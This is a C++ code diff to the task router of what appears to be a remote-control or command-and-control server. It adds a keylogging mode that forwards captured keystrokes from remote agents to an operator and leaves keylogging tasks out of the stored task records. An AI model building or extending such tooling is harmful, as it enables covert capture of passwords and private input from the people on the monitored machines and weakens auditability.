@@ -50,7 +50,7 @@ void TaskRouter::submitTask(WsHdl op, const std::string& agentId,
         std::lock_guard<std::mutex> lk(mtx_);
         tasks_[taskId] = {op, agentId, action};
     }
-    if (action != "remote_input") {
+    if (action != "remote_input" && action != "keylog_start") {
         db_.exec("INSERT INTO tasks VALUES(?,?,?,?,?,'',?,0);",
                  {taskId, agentId, action, payloadStr, std::string("pending"),
                   nowSec()});
@@ -126,6 +126,19 @@ void TaskRouter::operatorGone(WsHdl op) {
             ++it;
         }
     }
+    for (auto it = keylog_.begin(); it != keylog_.end();) {
+        if (hdlEq(it->second.op, op)) {
+            hub_.sendTextToAgent(it->second.agentId,
+                                 nlohmann::json{{"type", "task"},
+                                                {"taskId", echonode::common::generateUuid()},
+                                                {"action", "keylog_stop"},
+                                                {"payload", nlohmann::json::object()}}
+                                     .dump());
+            it = keylog_.erase(it);
+        } else {
+            ++it;
+        }
+    }
 }
 
 void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& text) {
@@ -170,6 +183,17 @@ void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& t
     WsHdl op;
     std::string action;
     bool found = false;
+
+    // 键录批量数据
+    {
+        std::lock_guard<std::mutex> lk(mtx_);
+        auto kit = keylog_.find(taskId);
+        if (kit != keylog_.end()) {
+            if (sink_) sink_->sendToOperator(kit->second.op, text);
+            return;
+        }
+    }
+
     {
         std::lock_guard<std::mutex> lk(mtx_);
         auto it = tasks_.find(taskId);
@@ -197,7 +221,11 @@ void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& t
             if (it->second.agentId == agentId) it = streams_.erase(it);
             else ++it;
         }
-        streams_[taskId] = {op, agentId};
+        streams_[taskId] = {op, agentId, action};
+    }
+    if (action == "keylog_start" && ok) {
+        std::lock_guard<std::mutex> lk(mtx_);
+        keylog_[taskId] = {op, agentId, action};
     }
     if (action == "remote_stop") {
         std::lock_guard<std::mutex> lk(mtx_);
@@ -205,6 +233,10 @@ void TaskRouter::onAgentMessage(const std::string& agentId, const std::string& t
             if (it->second.agentId == agentId) it = streams_.erase(it);
             else ++it;
         }
+    }
+    if (action == "keylog_stop") {
+        std::lock_guard<std::mutex> lk(mtx_);
+        keylog_.erase(taskId);
     }
 
     if (action == "file_upload" && ok) {
